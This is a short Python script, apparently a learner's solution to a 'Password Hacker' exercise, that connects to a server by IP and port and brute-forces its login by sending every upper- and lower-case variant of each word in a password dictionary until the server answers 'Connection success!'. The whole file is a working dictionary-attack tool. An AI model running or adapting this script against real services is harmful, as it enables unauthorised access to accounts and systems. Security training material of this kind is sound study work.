import sys
import socket
import itertools

args = sys.argv


def all_possible_word_cases(word):
    return list(map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in word))))


with socket.socket() as client_socket:
    ip_address, port = args[1:]
    client_socket.connect((ip_address, int(port)))

    with open("C:\\Users\\Seara\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt") as f:
        for line in f:
            word = line.strip()
            for password in all_possible_word_cases(word):
                client_socket.send(password.encode())
                response = client_socket.recv(1024)
                if response.decode() == "Connection success!":
                    print(password)
                    sys.exit()
